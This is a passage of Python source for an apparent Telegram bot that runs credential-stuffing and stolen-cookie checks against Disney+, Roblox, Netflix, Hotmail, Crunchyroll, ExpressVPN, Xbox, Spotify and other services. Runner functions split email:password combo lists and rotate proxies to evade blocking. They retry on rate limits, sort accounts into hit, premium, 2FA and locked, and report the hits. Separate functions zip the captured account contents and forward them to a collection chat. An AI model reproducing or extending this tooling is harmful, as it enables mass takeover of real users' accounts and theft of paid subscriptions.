        proxy = await proxy_mgr.get_verified_proxy_for("disney") if proxy_mgr else None
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, disney_check_one, email, password, proxy)

        s = result.get("status")
        if s == "HIT":
            hits.append(result)
            if proxy:
                proxy_mgr.mark_success(proxy)
            await bot.send_message(chat_id, disney_fmt_hit(result), parse_mode="HTML")
        elif s == "FREE":
            free.append(result)
            if proxy:
                proxy_mgr.mark_success(proxy)
            await bot.send_message(chat_id, disney_fmt_free(result), parse_mode="HTML")
        elif s == "RETRY":
            retry.append(result)
            if proxy:
                proxy_mgr.mark_failed(proxy)
        elif s == "CUSTOM":
            custom.append(result)
        elif s == "BAD":
            bad.append(result)
        else:
            err.append(result)
            if proxy:
                proxy_mgr.mark_failed(proxy)

        processed += 1
        if total > 1:
            now = time.monotonic()
            if now - last_edit >= 2.0:
                last_edit = now
                await safe_edit(status_msg, disney_fmt_progress(
                    processed, total, len(hits), len(free), len(bad),
                    len(retry), len(custom), len(err)))

    elapsed = time.time() - start_t
    user_results[uid].update({
        "disney_hit": hits, "disney_free": free, "disney_bad": bad,
        "disney_retry": retry, "disney_custom": custom, "disney_error": err,
        "disney_total": total, "processing": False,
    })
    if GC_STORE_CHAT_ID and hits:
        await _gc_store_disney(bot, hits, uid)
    await safe_edit(status_msg, disney_fmt_summary(
        total, len(hits), len(free), len(bad), len(retry),
        len(custom), len(err), elapsed),
        markup=main_markup("disney"))


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    ROBLOX RUNNER                                        ║
# ╚══════════════════════════════════════════════════════════════════════════╝

async def _run_roblox(uid, chat_id, total, combos, status_msg, bot: Bot):
    hit, prem, free, bad, twofa, locked, err = [], [], [], [], [], [], []
    processed = last_edit = 0.0
    start_t = time.time()
    proxy_mgr = PROXY_MANAGER

    for combo in combos:
        if ":" not in combo:
            bad.append({"status": "BAD", "reason": "malformed", "email": combo, "password": ""})
            processed += 1
            continue
        username, password = combo.split(":", 1)
        username, password = username.strip(), password.strip()
        if not username or not password:
            bad.append({"status": "BAD", "reason": "empty", "email": username, "password": password})
            processed += 1
            continue

        proxy = await proxy_mgr.get_verified_proxy_for("roblox") if proxy_mgr else None
        try:
            result = await roblox_check_one(username, password, proxy)
        except Exception as e:
            result = {"status": "ERROR", "reason": f"runner:{str(e)[:60]}",
                      "email": username, "password": password}

        s = result.get("status")
        if s == "HIT":
            hit.append(result)
            if proxy:
                proxy_mgr.mark_success(proxy)
            await bot.send_message(chat_id, roblox_fmt_hit(result), parse_mode="HTML")
        elif s == "PREMIUM":
            prem.append(result)
            if proxy:
                proxy_mgr.mark_success(proxy)
            await bot.send_message(chat_id, roblox_fmt_hit(result), parse_mode="HTML")
        elif s == "FREE":
            free.append(result)
            if proxy:
                proxy_mgr.mark_success(proxy)
            await bot.send_message(chat_id, roblox_fmt_free(result), parse_mode="HTML")
        elif s == "2FA":
            twofa.append(result)
            await bot.send_message(chat_id, roblox_fmt_2fa(result), parse_mode="HTML")
        elif s == "LOCKED":
            locked.append(result)
        elif s == "RETRY":
            err.append(result)
            if proxy:
                proxy_mgr.mark_failed(proxy)
        elif s == "BAD":
            bad.append(result)
        else:
            err.append(result)
            if proxy:
                proxy_mgr.mark_failed(proxy)

        processed += 1
        if total > 1:
            now = time.monotonic()
            if now - last_edit >= 2.0:
                last_edit = now
                await safe_edit(status_msg, roblox_fmt_progress(
                    processed, total, len(hit), len(prem), len(free),
                    len(bad), len(twofa), len(locked), len(err)))

    elapsed = time.time() - start_t
    user_results[uid].update({
        "roblox_hit": hit, "roblox_premium": prem, "roblox_free": free,
        "roblox_bad": bad, "roblox_2fa": twofa, "roblox_locked": locked,
        "roblox_error": err, "roblox_total": total, "processing": False,
    })
    if GC_STORE_CHAT_ID and (hit or prem):
        await _gc_store_roblox(bot, hit, prem, uid)
    await safe_edit(status_msg, roblox_fmt_summary(
        total, len(hit), len(prem), len(free), len(bad),
        len(twofa), len(locked), len(err), elapsed),
        markup=main_markup("roblox"))
# ▼ CHUNK 7 END — PASTE CHUNK 8 BELOW THIS LINE ▼


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    GC STORE — DAZN / DEEZER / DISNEY+ / ROBLOX          ║
# ╚══════════════════════════════════════════════════════════════════════════╝

async def _gc_store_dazn(bot: Bot, hits: list, uid=0):
    if not GC_STORE_CHAT_ID or not hits:
        return
    try:
        entries = []
        for idx, r_ in enumerate(hits, 1):
            plan_slug = _gc_safe_slug(r_.get("plan", "Unknown"))
            entries.append({
                "content": r_.get("content", ""),
                "_folder": f"hit/{plan_slug}",
                "_name":   f"hit_{idx}.txt",
            })
        meta = {"Service": "DAZN", "User ID": uid, "Hits": len(hits)}
        buf = _gc_build_zip(entries, meta)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(
            GC_STORE_CHAT_ID,
            document=BufferedInputFile(buf.getvalue(), filename=f"dazn_gc_{_gc_user_tag(uid)}_{ts}.zip"),
            caption=(f"{E_ZIP} <b>DAZN GC</b>\n"
                     f"{E_ID} User: <code>{uid}</code>\n"
                     f"{DZ_PREMIUM} Hits: <b>{len(hits)}</b>"),
            parse_mode="HTML")
    except Exception as e:
        logger.warning(f"GC dazn error: {e}")


async def _gc_store_deezer(bot: Bot, premium: list, uid=0):
    if not GC_STORE_CHAT_ID or not premium:
        return
    try:
        entries = []
        for idx, r_ in enumerate(premium, 1):
            offer_slug = _gc_safe_slug(r_.get("offer", "Unknown"))
            entries.append({
                "content": r_.get("content", ""),
                "_folder": f"premium/{offer_slug}",
                "_name":   f"premium_{idx}.txt",
            })
        meta = {"Service": "Deezer", "User ID": uid, "Premium": len(premium)}
        buf = _gc_build_zip(entries, meta)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(
            GC_STORE_CHAT_ID,
            document=BufferedInputFile(buf.getvalue(), filename=f"deezer_gc_{_gc_user_tag(uid)}_{ts}.zip"),
            caption=(f"{E_ZIP} <b>Deezer GC</b>\n"
                     f"{E_ID} User: <code>{uid}</code>\n"
                     f"{DZR_PREMIUM} Premium: <b>{len(premium)}</b>"),
            parse_mode="HTML")
    except Exception as e:
        logger.warning(f"GC deezer error: {e}")


async def _gc_store_disney(bot: Bot, hits: list, uid=0):
    if not GC_STORE_CHAT_ID or not hits:
        return
    try:
        entries = []
        for idx, r_ in enumerate(hits, 1):
            plan_slug = _gc_safe_slug(r_.get("plan", "Unknown"))
            entries.append({
                "content": r_.get("content", ""),
                "_folder": f"hit/{plan_slug}",
                "_name":   f"hit_{idx}.txt",
            })
        meta = {"Service": "Disney+", "User ID": uid, "Hits": len(hits)}
        buf = _gc_build_zip(entries, meta)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(
            GC_STORE_CHAT_ID,
            document=BufferedInputFile(buf.getvalue(), filename=f"disney_gc_{_gc_user_tag(uid)}_{ts}.zip"),
            caption=(f"{E_ZIP} <b>Disney+ GC</b>\n"
                     f"{E_ID} User: <code>{uid}</code>\n"
                     f"{DS_PREMIUM} Hits: <b>{len(hits)}</b>"),
            parse_mode="HTML")
    except Exception as e:
        logger.warning(f"GC disney error: {e}")


async def _gc_store_roblox(bot: Bot, hit: list, prem: list, uid=0):
    if not GC_STORE_CHAT_ID or not (hit or prem):
        return
    try:
        entries = []
        for bucket_name, bucket in [("premium", prem), ("hit", hit)]:
            for idx, r_ in enumerate(bucket, 1):
                u = r_.get("user", {}) or {}
                entries.append({
                    "content": r_.get("content", ""),
                    "_folder": bucket_name,
                    "_name":   f"{bucket_name}_{idx}_{_gc_safe_slug(u.get('username', 'unk'))}.txt",
                })
        meta = {
            "Service": "Roblox", "User ID": uid,
            "Premium": len(prem), "Hit": len(hit),
        }
        buf = _gc_build_zip(entries, meta)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(
            GC_STORE_CHAT_ID,
            document=BufferedInputFile(buf.getvalue(), filename=f"roblox_gc_{_gc_user_tag(uid)}_{ts}.zip"),
            caption=(f"{E_ZIP} <b>Roblox GC</b>\n"
                     f"{E_ID} User: <code>{uid}</code>\n"
                     f"{RB_PREMIUM} Premium: <b>{len(prem)}</b>  "
                     f"{RB_HIT} Hit: <b>{len(hit)}</b>"),
            parse_mode="HTML")
    except Exception as e:
        logger.warning(f"GC roblox error: {e}")
# ▼ CHUNK 8A END — PASTE CHUNK 8B BELOW THIS LINE ▼


async def _run_surfshark(uid, chat_id, total, files, ext, status_msg, bot: Bot):
    premium, free, dead = [], [], []
    processed = revived_n = 0; last_edit = 0.0
    loop = asyncio.get_event_loop()
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [loop.run_in_executor(executor, ss_check_file, fp) for fp in files]
        for coro in asyncio.as_completed(futures):
            try:
                result = await coro
            except Exception as e:
                result = {"status": "DEAD", "reason": str(e)[:50], "filename": "?", "content": ""}
            s = result.get("status")
            if s == "PREMIUM":
                premium.append(result)
                if result.get("revived"): revived_n += 1
            elif s == "FREE":
                free.append(result)
            else:
                dead.append(result)
            processed += 1
            if total > 1:
                now = time.monotonic()
                if now - last_edit >= 2.0:
                    last_edit = now
                    await safe_edit(status_msg, ss_fmt_progress(processed, total, len(premium), len(free), len(dead), revived_n))
    user_results[uid].update({"ss_premium": premium, "ss_free": free, "ss_dead": dead,
                              "ss_total": total, "processing": False,
                              "ss_awaiting_code": False, "ss_login_data": None})
    if GC_STORE_CHAT_ID and premium:
        await _gc_store_ss(bot, premium, uid)
    if ext != "zip" and total == 1:
        only = (premium or free or dead)[0]
        await safe_edit(status_msg, ss_fmt_single(only), markup=main_markup("surfshark"))
    else:
        await safe_edit(status_msg, ss_fmt_summary(total, len(premium), len(free), len(dead), revived_n),
                        markup=main_markup("surfshark"))


async def _run_spotify(uid, chat_id, total, files, ext, temp_path, status_msg, bot: Bot):
    premium, free, dead = [], [], []
    start = time.time(); processed = 0
    UPDATE_EVERY = max(1, total // 20)
    loop = asyncio.get_event_loop()
    for fpath in files:
        result = await loop.run_in_executor(None, sp_check_file, fpath)
        if fpath != temp_path:
            try: os.remove(fpath)
            except: pass
        s = result.get("status")
        if s == "PREMIUM": premium.append(result)
        elif s == "FREE": free.append(result)
        else: dead.append(result)
        processed += 1
        if processed % UPDATE_EVERY == 0 or processed == total:
            await safe_edit(status_msg, sp_fmt_progress(processed, total, len(premium), len(free), len(dead)))
    elapsed = time.time() - start
    user_results[uid].update({"sp_premium": premium, "sp_free": free, "sp_dead": dead,
                              "sp_total": total, "processing": False})
    if GC_STORE_CHAT_ID and premium:
        await _gc_store_sp(bot, premium, uid)
    if ext != "zip" and total == 1:
        only = (premium or free or dead)[0]
        await safe_edit(status_msg,
                        sp_fmt_premium(only) if only["status"] == "PREMIUM" else
                        (sp_fmt_free(only) if only["status"] == "FREE" else sp_fmt_dead(only)),
                        markup=main_markup("spotify"))
    else:
        await safe_edit(status_msg, sp_fmt_summary(len(premium), len(free), len(dead), total, elapsed),
                        markup=main_markup("spotify"))


async def _run_hotstar(uid, chat_id, total, files, ext, status_msg, bot: Bot):
    live, device, free, inv = [], [], [], []
    processed = last_edit = 0.0
    loop = asyncio.get_event_loop()
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [loop.run_in_executor(executor, hs_check_file, fp) for fp in files]
        for coro in asyncio.as_completed(futures):
            try:
                result = await coro
            except Exception as e:
                result = {"status": "INVALID", "reason": str(e)[:50], "filename": "?"}
            s = result.get("status", "INVALID")
            if s == "LIVE": live.append(result)
            elif s == "DEVICE_LIMIT": device.append(result)
            elif s == "FREE": free.append(result)
            else: inv.append(result)
            processed += 1
            if total > 1:
                now = time.monotonic()
                if now - last_edit >= 2.0:
                    last_edit = now
                    await safe_edit(status_msg, hs_fmt_progress(int(processed), total, len(live), len(device),
                                                                len(free), len(inv), hs_plan_breakdown(live)))
    user_results[uid].update({"hs_live": live, "hs_device": device, "hs_free": free,
                              "hs_invalid": inv, "hs_total": total, "processing": False})
    if GC_STORE_CHAT_ID and (live or device or free):
        await _gc_store_hs(bot, live, device, free, uid)
    if ext != "zip" and total == 1:
        only = (live or device or free or inv)[0]
        await safe_edit(status_msg, hs_fmt_single(only), markup=main_markup("hotstar"))
    else:
        await safe_edit(status_msg, hs_fmt_summary(total, len(live), len(device), len(free),
                                                   len(inv), hs_plan_breakdown(live)),
                        markup=main_markup("hotstar"))


async def _run_netflix(uid, chat_id, total, files, ext, status_msg, bot: Bot):
    sub = user_results[uid].get("nf_sub", "check")
    premium, free_l, dead, tokens = [], [], [], []
    processed = last_edit = 0.0; hit_n = 0
    loop = asyncio.get_event_loop()
    start_t = time.monotonic()
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [loop.run_in_executor(executor, nf_check_file, fp, sub) for fp in files]
        for coro in asyncio.as_completed(futures):
            try:
                result = await coro
            except Exception as e:
                result = {"status": "DEAD", "reason": str(e)[:50], "filename": "?", "content": ""}
            s = result.get("status", "DEAD")
            if s == "PREMIUM":
                hit_n += 1; result["hit_num"] = hit_n
                premium.append(result)
                await bot.send_message(chat_id, nf_fmt_premium(result), parse_mode="HTML")
            elif s == "FREE":
                free_l.append(result)
            elif s == "TOKEN":
                hit_n += 1; result["hit_num"] = hit_n
                tokens.append(result)
                await bot.send_message(chat_id, nf_fmt_token(result), parse_mode="HTML")
            else:
                dead.append(result)
            processed += 1
            if total > 1:
                now = time.monotonic()
                if now - last_edit >= 2.0:
                    last_edit = now
                    await safe_edit(status_msg, nf_fmt_progress(int(processed), total,
                                                                len(premium) + len(tokens),
                                                                len(free_l), len(dead), sub))
    elapsed = time.monotonic() - start_t
    user_results[uid].update({"nf_premium": premium, "nf_free": free_l, "nf_dead": dead,
                              "nf_tokens": tokens, "nf_total": total, "processing": False})
    if GC_STORE_CHAT_ID and premium:
        await _gc_store_nf(bot, premium, uid)
    if ext != "zip" and total == 1:
        only = (premium or tokens or free_l or dead)[0]
        if only.get("status") == "PREMIUM":
            await safe_edit(status_msg, nf_fmt_premium(only), markup=main_markup("netflix"))
        elif only.get("status") == "TOKEN":
            await safe_edit(status_msg, nf_fmt_token(only), markup=main_markup("netflix"))
        elif only.get("status") == "FREE":
            await safe_edit(status_msg, nf_fmt_free(only), markup=main_markup("netflix"))
        else:
            await safe_edit(status_msg, nf_fmt_dead(only), markup=main_markup("netflix"))
    else:
        hits = len(premium) + len(tokens)
        await safe_edit(status_msg, nf_fmt_summary(hits, len(free_l), len(dead), total, elapsed, sub),
                        markup=main_markup("netflix"))


async def _run_hbomax(uid, chat_id, total, files, ext, status_msg, bot: Bot):
    live, dead = [], []
    processed = last_edit = 0.0; start = time.time()
    loop = asyncio.get_event_loop()
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [loop.run_in_executor(executor, hbo_check_file, fp) for fp in files]
        for coro in asyncio.as_completed(futures):
            try:
                result = await coro
            except Exception as e:
                result = {"status": "DEAD", "reason": str(e)[:50], "filename": "?", "content": ""}
            if result.get("status") == "LIVE": live.append(result)
            else: dead.append(result)
            processed += 1
            if total > 1:
                now = time.monotonic()
                if now - last_edit >= 2.0:
                    last_edit = now
                    await safe_edit(status_msg,
                                    f"{HBO_ICON} <b>Checking HBO Max…</b>\n\n{E_COUNT} Progress: <b>{processed}/{total}</b>\n"
                                    f"{HBO_LIVE} Live: <b>{len(live)}</b>\n{HBO_DEAD} Dead: <b>{len(dead)}</b>")
    elapsed = time.time() - start
    user_results[uid].update({"hbo_live": live, "hbo_dead": dead, "hbo_total": total, "processing": False})
    if GC_STORE_CHAT_ID and live:
        await _gc_store_hbo(bot, live, uid)
    if ext != "zip" and total == 1:
        only = (live or dead)[0]
        await safe_edit(status_msg, hbo_fmt_single(only), markup=main_markup("hbomax"))
    else:
        await safe_edit(status_msg, hbo_fmt_summary(total, len(live), len(dead), elapsed),
                        markup=main_markup("hbomax"))


async def _run_hotmail(uid, chat_id, total, combos, status_msg, bot: Bot):
    hits, dead = [], []
    processed = last_edit = 0.0; start_t = time.time()
    proxy_mgr = PROXY_MANAGER

    for combo in combos:
        if ":" not in combo:
            dead.append({"status": "DEAD", "reason": "malformed", "email": combo, "password": ""})
            processed += 1
            continue
        email, password = combo.split(":", 1)
        email, password = email.strip(), password.strip()
        if not email or not password:
            dead.append({"status": "DEAD", "reason": "empty", "email": email, "password": password})
            processed += 1
            continue

        proxy = await proxy_mgr.get_verified_proxy_for("hotmail") if proxy_mgr else None
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, hm_check_one, email, password, proxy)

        if result.get("status") == "HIT":
            hits.append(result)
            if proxy: proxy_mgr.mark_success(proxy)
            await bot.send_message(chat_id, hm_fmt_hit(result), parse_mode="HTML")
        else:
            dead.append(result)
            if proxy: proxy_mgr.mark_failed(proxy)

        processed += 1
        if total > 1:
            now = time.monotonic()
            if now - last_edit >= 2.0:
                last_edit = now
                await safe_edit(status_msg, hm_fmt_progress(processed, total, len(hits), len(dead)))

    elapsed = time.time() - start_t
    user_results[uid].update({"hm_hits": hits, "hm_dead": dead, "hm_total": total, "processing": False})
    if GC_STORE_CHAT_ID and hits:
        await _gc_store_hm(bot, hits, uid)
    await safe_edit(status_msg, hm_fmt_summary(total, len(hits), len(dead), elapsed),
                    markup=main_markup("hotmail"))


async def _run_msfullcap(uid, chat_id, total, combos, status_msg, bot: Bot):
    hits, bad, tfa = [], [], []
    processed = last_edit = 0.0; start_t = time.time()
    proxy_mgr = PROXY_MANAGER

    for combo in combos:
        if ":" not in combo:
            bad.append({"status": "DEAD", "reason": "malformed", "email": combo, "password": ""})
            processed += 1
            continue
        email, password = combo.split(":", 1)
        email, password = email.strip(), password.strip()

        proxy = await proxy_mgr.get_verified_proxy_for("msfullcap") if proxy_mgr else None
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, msfc_check_one, email, password, proxy)

        if result.get("status") == "HIT":
            hits.append(result)
            if proxy: proxy_mgr.mark_success(proxy)
            await bot.send_message(chat_id, msfc_fmt_hit(result), parse_mode="HTML")
        elif result.get("status") == "2FA":
            tfa.append(result)
        else:
            bad.append(result)
            if proxy: proxy_mgr.mark_failed(proxy)

        processed += 1
        if total > 1:
            now = time.monotonic()
            if now - last_edit >= 2.0:
                last_edit = now
                await safe_edit(status_msg, msfc_fmt_progress(processed, total, len(hits), len(bad), len(tfa)))

    elapsed = time.time() - start_t
    user_results[uid].update({"msfc_hits": hits, "msfc_bad": bad, "msfc_2fa": tfa,
                              "msfc_total": total, "processing": False})
    if GC_STORE_CHAT_ID and hits:
        await _gc_store_msfc(bot, hits, uid)
    await safe_edit(status_msg, msfc_fmt_summary(total, len(hits), len(bad), len(tfa), elapsed),
                    markup=main_markup("msfullcap"))


async def _run_crunchyroll(uid, chat_id, total, combos, status_msg, bot: Bot):
    sub_mode = user_results[uid].get("cr_sub", "check")
    hit, custom, fail, retry = [], [], [], []
    processed = last_edit = 0.0; start_t = time.time()
    proxy_mgr = PROXY_MANAGER

    for combo in combos:
        if ":" not in combo:
            fail.append({"status": "FAIL", "reason": "malformed", "email": combo, "password": ""})
            processed += 1
            continue
        email, password = combo.split(":", 1)
        email, password = email.strip(), password.strip()

        proxy = await proxy_mgr.get_verified_proxy_for("crunchyroll") if proxy_mgr else None
        loop = asyncio.get_event_loop()
        fn = cr_check_token_only if sub_mode == "token" else cr_check_one
        result = await loop.run_in_executor(None, fn, email, password, proxy)

        s = result.get("status")
        if s in ("SUCCESS", "VALID"):
            hit.append(result)
            if proxy: proxy_mgr.mark_success(proxy)
            await bot.send_message(chat_id, cr_fmt_hit(result, sub_mode), parse_mode="HTML")
        elif s == "CUSTOM":
            custom.append(result)
            await bot.send_message(chat_id, cr_fmt_custom(result), parse_mode="HTML")
        elif s == "RETRY":
            retry.append(result)
        else:
            fail.append(result)
            if proxy: proxy_mgr.mark_failed(proxy)

        processed += 1
        if total > 1:
            now = time.monotonic()
            if now - last_edit >= 2.0:
                last_edit = now
                await safe_edit(status_msg, cr_fmt_progress(processed, total, len(hit), len(custom), len(fail), len(retry)))

    elapsed = time.time() - start_t
    user_results[uid].update({"cr_hit": hit, "cr_custom": custom, "cr_fail": fail,
                              "cr_retry": retry, "cr_total": total, "processing": False})
    if GC_STORE_CHAT_ID and (hit or custom):
        await _gc_store_cr(bot, hit, custom, uid)
    await safe_edit(status_msg, cr_fmt_summary(total, len(hit), len(custom), len(fail), len(retry), elapsed),
                    markup=main_markup("crunchyroll"))


async def _run_crunchyroll2(uid, chat_id, total, combos, status_msg, bot: Bot):
    sub_mode = user_results[uid].get("cr2_sub", "check")
    premium, free, valid, invalid, mfa = [], [], [], [], []
    processed = last_edit = 0.0; start_t = time.time()
    proxy_mgr = PROXY_MANAGER

    for combo in combos:
        if ":" not in combo:
            invalid.append({"status": "INVALID", "reason": "malformed", "email": combo, "password": ""})
            processed += 1
            continue
        email, password = combo.split(":", 1)
        email, password = email.strip(), password.strip()

        proxy = await proxy_mgr.get_verified_proxy_for("crunchyroll2") if proxy_mgr else None
        loop = asyncio.get_event_loop()
        token_only = (sub_mode == "token")
        result = await loop.run_in_executor(None, cr2_check_one, email, password, proxy, token_only)

        s = result.get("status")
        if s == "PREMIUM":
            premium.append(result)
            if proxy: proxy_mgr.mark_success(proxy)
            await bot.send_message(chat_id, cr2_fmt_hit(result), parse_mode="HTML")
        elif s == "FREE":
            free.append(result)
            await bot.send_message(chat_id, cr2_fmt_hit(result), parse_mode="HTML")
        elif s == "VALID":
            valid.append(result)
            await bot.send_message(chat_id, cr2_fmt_hit(result), parse_mode="HTML")
        elif s == "MFA":
            mfa.append(result)
        else:
            invalid.append(result)
            if proxy: proxy_mgr.mark_failed(proxy)

        processed += 1
        if total > 1:
            now = time.monotonic()
            if now - last_edit >= 2.0:
                last_edit = now
                await safe_edit(status_msg, cr2_fmt_progress(processed, total, len(premium), len(free), len(valid), len(invalid)))

    elapsed = time.time() - start_t
    user_results[uid].update({"cr2_premium": premium, "cr2_free": free, "cr2_valid": valid,
                              "cr2_invalid": invalid, "cr2_mfa": mfa,
                              "cr2_total": total, "processing": False})
    if GC_STORE_CHAT_ID and (premium or free or valid):
        await _gc_store_cr2(bot, premium, free, valid, uid)
    await safe_edit(status_msg, cr2_fmt_summary(total, len(premium), len(free), len(valid),
                                                len(invalid), len(mfa), elapsed),
                    markup=main_markup("crunchyroll2"))


async def _run_netflixcap(uid, chat_id, total, combos, status_msg, bot: Bot):
    hit, free, bad, tfa, custom = [], [], [], [], []
    processed = last_edit = 0.0; start_t = time.time()
    proxy_mgr = PROXY_MANAGER

    for combo in combos:
        if ":" not in combo:
            bad.append({"status": "BAD", "reason": "malformed", "email": combo, "password": ""})
            processed += 1
            continue
        email, password = combo.split(":", 1)
        email, password = email.strip(), password.strip()

        proxy = await proxy_mgr.get_verified_proxy_for("netflixcap") if proxy_mgr else None
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, nfc_check_one, email, password, proxy)

        s = result.get("status")
        if s == "HIT":
            hit.append(result)
            if proxy: proxy_mgr.mark_success(proxy)
            await bot.send_message(chat_id, nfc_fmt_hit(result), parse_mode="HTML")
        elif s == "FREE":
            free.append(result)
        elif s == "2FA":
            tfa.append(result)
        elif s == "CUSTOM":
            custom.append(result)
        else:
            bad.append(result)
            if proxy: proxy_mgr.mark_failed(proxy)

        processed += 1
        if total > 1:
            now = time.monotonic()
            if now - last_edit >= 2.0:
                last_edit = now
                await safe_edit(status_msg, nfc_fmt_progress(processed, total, len(hit), len(free),
                                                             len(bad), len(tfa), len(custom)))

    elapsed = time.time() - start_t
    user_results[uid].update({"nfc_hit": hit, "nfc_free": free, "nfc_bad": bad,
                              "nfc_2fa": tfa, "nfc_custom": custom,
                              "nfc_total": total, "processing": False})
    if GC_STORE_CHAT_ID and hit:
        await _gc_store_nfc(bot, hit, uid)
    await safe_edit(status_msg, nfc_fmt_summary(total, len(hit), len(free), len(bad),
                                                len(tfa), len(custom), elapsed),
                    markup=main_markup("netflixcap"))


async def _run_expressvpn(uid, chat_id, total, combos, status_msg, bot: Bot):
    premium, free, dead, retry = [], [], [], []
    processed = last_edit = 0.0; start_t = time.time()
    proxy_mgr = PROXY_MANAGER

    for combo in combos:
        if ":" not in combo:
            dead.append({"status": "DEAD", "reason": "malformed", "email": combo, "password": ""})
            processed += 1
            continue
        email, password = combo.split(":", 1)
        email, password = email.strip(), password.strip()

        proxy = await proxy_mgr.get_verified_proxy_for("expressvpn") if proxy_mgr else None
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, ex_check_one, email, password, proxy)

        attempts = 0
        while result.get("status") == "RETRY" and result.get("reason") == "rate_limited" and attempts < 50:
            attempts += 1
            await asyncio.sleep(0.5)
            result = await loop.run_in_executor(None, ex_check_one, email, password, proxy)

        s = result.get("status")
        if s == "PREMIUM":
            premium.append(result)
            if proxy: proxy_mgr.mark_success(proxy)
            await bot.send_message(chat_id, ex_fmt_premium(result), parse_mode="HTML")
        elif s == "FREE":
            free.append(result)
        elif s == "RETRY":
            retry.append(result)
        else:
            dead.append(result)
            if proxy: proxy_mgr.mark_failed(proxy)

        processed += 1
        if total > 1:
            now = time.monotonic()
            if now - last_edit >= 2.0:
                last_edit = now
                await safe_edit(status_msg, ex_fmt_progress(processed, total, len(premium),
                                                             len(free), len(dead), len(retry)))

    elapsed = time.time() - start_t
    user_results[uid].update({"ex_premium": premium, "ex_free": free, "ex_dead": dead,
                              "ex_retry": retry, "ex_total": total, "processing": False})
    if GC_STORE_CHAT_ID and premium:
        await _gc_store_ex(bot, premium, uid)
    await safe_edit(status_msg, ex_fmt_summary(total, len(premium), len(free),
                                                len(dead), len(retry), elapsed),
                    markup=main_markup("expressvpn"))


async def _run_primevideo(uid, chat_id, total, files, ext, status_msg, bot: Bot):
    state = user_results[uid]
    paid, free, unknown, dup, failed, error = [], [], [], [], [], []
    seen_keys = state.get("pv_seen_keys") or set()
    processed = last_edit = 0.0; start = time.time()
    proxy_mgr = PROXY_MANAGER
    loop = asyncio.get_event_loop()

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [loop.run_in_executor(executor, pv_check_one, fp, None) for fp in files]
        for coro in asyncio.as_completed(futures):
            try:
                result = await coro
            except Exception as e:
                result = {"status": "ERROR", "reason": str(e)[:50], "filename": "?", "content": ""}
            s = result.get("status", "ERROR")
            if s in ("PAID", "FREE", "UNKNOWN"):
                dk = result.get("duplicate_key", "")
                if dk and dk in seen_keys:
                    dup.append(result)
                else:
                    if dk:
                        seen_keys.add(dk)
                    if s == "PAID":
                        paid.append(result)
                        await bot.send_message(chat_id, pv_fmt_paid(result), parse_mode="HTML")
                    elif s == "FREE":
                        free.append(result)
                        await bot.send_message(chat_id, pv_fmt_free(result), parse_mode="HTML")
                    else:
                        unknown.append(result)
                        await bot.send_message(chat_id, pv_fmt_unknown(result), parse_mode="HTML")
            elif s == "FAILED":
                failed.append(result)
            else:
                error.append(result)
            processed += 1
            if total > 1:
                now = time.monotonic()
                if now - last_edit >= 2.0:
                    last_edit = now
                    await safe_edit(status_msg, pv_fmt_progress(
                        processed, total, len(paid), len(free), len(unknown),
                        len(dup), len(failed)))

    elapsed = time.time() - start
    state.update({
        "pv_paid": paid, "pv_free": free, "pv_unknown": unknown,
        "pv_duplicate": dup, "pv_failed": failed, "pv_error": error,
        "pv_total": total, "pv_seen_keys": seen_keys, "processing": False,
    })
    if GC_STORE_CHAT_ID and paid:
        await _gc_store_pv(bot, paid, uid)
    await safe_edit(status_msg, pv_fmt_summary(total, len(paid), len(free), len(unknown),
                                               len(dup), len(failed), len(error), elapsed),
                    markup=main_markup("primevideo"))

async def _run_xbox(uid, chat_id, total, combos, status_msg, bot: Bot):
    """Xbox Live Auditor — full profile + GamePass + games list."""
    premium, hit, free, noxbox = [], [], [], []
    bad, locked, error = [], [], []
    processed = last_edit = 0.0; start_t = time.time()
    proxy_mgr = PROXY_MANAGER

    for combo in combos:
        if ":" not in combo:
            bad.append({"status": "BAD", "reason": "malformed", "email": combo, "password": ""})
            processed += 1
            continue
        email, password = combo.split(":", 1)
        email, password = email.strip(), password.strip()
        if not email or not password:
            bad.append({"status": "BAD", "reason": "empty", "email": email, "password": password})
            processed += 1
            continue

        proxy = await proxy_mgr.get_verified_proxy_for("xbox") if proxy_mgr else None
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, xbox_check_one, email, password, proxy)

        status = result.get("status", "ERROR")
        if status == "OK":
            verdict = result.get("verdict", "FREE")
            if verdict == "PREMIUM":
                premium.append(result)
                if proxy: proxy_mgr.mark_success(proxy)
                await bot.send_message(chat_id, xbox_fmt_premium(result), parse_mode="HTML")
            elif verdict == "HIT":
                hit.append(result)
                if proxy: proxy_mgr.mark_success(proxy)
                await bot.send_message(chat_id, xbox_fmt_hit(result), parse_mode="HTML")
            else:  # FREE
                free.append(result)
                if proxy: proxy_mgr.mark_success(proxy)
                await bot.send_message(chat_id, xbox_fmt_free(result), parse_mode="HTML")
        elif status == "NO_XBOX":
            noxbox.append(result)
        elif status == "LOCKED":
            locked.append(result)
            if proxy: proxy_mgr.mark_failed(proxy) if result.get("reason") == "too_many_attempts" else None
        elif status == "BAD":
            bad.append(result)
        else:
            error.append(result)
            if proxy: proxy_mgr.mark_failed(proxy)

        processed += 1
        if total > 1:
            now = time.monotonic()
            if now - last_edit >= 2.0:
                last_edit = now
                await safe_edit(status_msg, xbox_fmt_progress(
                    processed, total, len(premium), len(hit), len(free),
                    len(noxbox), len(bad), len(locked), len(error)))

    elapsed = time.time() - start_t
    user_results[uid].update({
        "xbox_premium": premium, "xbox_hit": hit, "xbox_free": free,
